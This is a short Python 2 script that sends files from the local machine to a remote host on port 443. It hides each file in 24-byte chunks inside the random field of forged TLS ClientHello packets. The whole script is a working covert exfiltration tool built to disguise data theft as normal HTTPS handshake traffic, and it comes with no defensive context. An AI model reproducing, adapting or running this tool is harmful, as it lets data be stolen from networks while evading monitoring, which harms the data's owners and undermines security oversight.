#!/usr/bin/env python

import sys
import socket
import time
import struct

p = lambda x : struct.pack('<L', x)

HOST = ''
PORT = 443
DATA_LEN = 24
RANDOM_FIELD_S = 11
RANDOM_FIELD_E = 43

client_hello = open('SSL_client_hello').read()

def send_data(sock, data_size, data):
  if data_size < 24:
    data += "\x00" * (24 - data_size)

  packet = p(int(time.time()))[::-1] + p(data_size) + data
  packet = client_hello[:RANDOM_FIELD_S] + packet + client_hello[RANDOM_FIELD_E:]
  sock.send(packet)

  ret = sock.recv(5)
  if ret == '0':
    ret = send_data(sock, data_size, data)

  return ret

def send_file(filename):
  data = open(filename).read()
  data_size = len(data)

  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect((HOST, PORT))

  for i in range(data_size / 24):
    send_data(sock, 24, data[i * 24 : (i + 1) * 24])

  if data_size % 24 != 0:
    rest_size = data_size % 24
    send_data(sock, rest_size, data[-rest_size:])

  send_data(sock, 0, "\x00" * 24)
  sock.close()

def main():
  for filename in sys.argv[2:]:
    print("[*] Send {}".format(filename))
    send_file(filename)
    print("[*] Complete")
    time.sleep(1)

if __name__ == '__main__':
  HOST = sys.argv[1]
  main()
